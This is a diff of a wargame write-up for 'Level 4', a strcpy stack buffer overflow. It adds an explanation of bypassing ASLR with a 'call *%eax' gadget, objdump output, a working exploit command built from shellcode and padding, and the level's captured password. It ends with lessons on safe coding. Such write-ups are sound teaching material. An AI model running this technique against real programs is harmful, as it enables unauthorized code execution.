@@ -1,5 +1,7 @@
 ## Level 4: always check array boundaries
 
+todo: redo commands using the remote shell, espcially gdb
+
 The source code on this level is surprisingly simple:
 ```
 void fun(char *str) {
@@ -148,15 +150,60 @@ We can confirm the size of our shellcode using `wc -c`:
 $ printf $EGG | wc -c
 45
 ```
-45 characters,
-that means we will need 1036 - 45 = 991 padding characters.
+Thus, we will need 1036 - 45 = 991 padding characters.
 But what about the address?
 We want to jump to the address of `buf`,
 but how can we know that?
 Unfortunately, we cannot.
 In the past,
+the stack used to be always at the same address in memory,
+which was relatively easy to exploit.
+If you could get your shellcode on the stack,
+it was relatively easy to guess the right address to jump at.
+As of today,
+this is no longer feasible,
+thanks to the address space layout randomization (ASLR) used in modern operating systems.
 
+So what can we do?
+After hours of poking around,
+I stumbled upon some interesting details which can be combined to an interesting effect:
+
+- On 32-bit x86 processors (the architecture of the live CD),
+  a function that returns a pointer value places its result in register `%eax`.
+
+- There happen to be addresses inside the program which execute the code at the address stored in register `%eax`.
+
+- `strcpy` is the last call in the function `fun`.
+
+What happens is,
+the `strcpy` will return the address of the destination array `buf`,
+which will be stored in register `%eax`.
+And since it is the last line of code in the function,
+the register will still contain the address of `buf` when the function returns.
+Thus,
+if we overwrite the return address in the memory with the address that executes jumping to the content of `%eax`,
+and consequently `buf`,
+our shellcode will get executed.
+
+We can find the location of calls with register `%eax` with:
 ```
-$EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
-$EGG$(python -c 'print "A" * 991')$(printf '\xfb\x85\x04\x08')
+level03@box:/levels/level04$ objdump -d level04 | grep call.*eax
+ 8048488:	ff 14 85 1c 9f 04 08 	call   *0x8049f1c(,%eax,4)
+ 80484cf:	ff d0                	call   *%eax
+ 80485fb:	ff d0                	call   *%eax
 ```
+That's it, we can use either `0x080484cf` or `0x080485fb` as the address to jump to.
+```
+level03@box:/levels/level04$ ./level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
+/levels/level04 $ cat /home/level04/.password 
+paegeiqu
+```
+
+What can we learn from all this?
+
+- Don't use unsafe functions like `strcpy`.
+  Stick to their safer versions like `strncpy`.
+
+- Always make sure that arrays cannot be accessed beyond their boundaries.
+
+- Always validate user input, and set reasonable limits to the length.
